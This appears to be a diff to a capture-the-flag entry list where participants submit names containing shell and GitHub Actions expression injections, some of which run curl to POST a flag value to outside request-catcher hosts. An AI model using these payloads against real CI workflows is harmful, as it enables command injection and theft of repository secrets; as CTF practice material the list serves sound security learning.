@@ -722,3 +722,7 @@ wgblikeW:a"; set +e; curl https://hookb.in/JKeNn2JXXLig0l9902wn?flag=$flag;#
 Zeker62:${{ github.event.issue.number }} $( flag )
 ";echo ls"
 coderjingluo:${{ secrets.FLAG }}
+hypnguyen1209:${{ github.event.issue.number }} $( flag )
+";echo \`ls\`"
+Nkzlxs:$flag
+sln-1550:';curl -X POST -d "$flag" https://hyp.requestcatcher.com;echo '1
